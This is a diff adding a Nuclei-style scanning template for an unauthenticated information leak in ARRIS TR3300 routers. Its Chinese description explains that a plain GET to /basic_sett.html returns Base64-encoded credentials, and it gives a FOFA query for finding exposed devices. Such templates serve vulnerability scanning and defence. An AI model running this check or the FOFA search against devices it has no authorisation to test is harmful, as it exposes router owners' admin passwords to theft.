@@ -1,0 +1,24 @@
+id: arris-router-info-leak
+
+info:
+  name: "Arris路由器basic_sett接口敏感配置数据暴露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="base64encode(document.tF.pws.value)" || body="ARRIS TR3300"
+      该漏洞源于目标设备在basic_sett接口未正确实施访问控制机制，导致攻击者可通过发送特定请求直接获取设备敏感配置数据。受影响系统包含ARRIS TR3300等型号路由器，攻击者无需身份验证即可访问包含Base64编码的凭证信息。此漏洞可能被用于进一步实施横向渗透攻击或获取设备管理权限。
+  tags: Arris
+
+http:
+- raw:
+  - |
+    GET /basic_sett.html HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'cur_passwd'
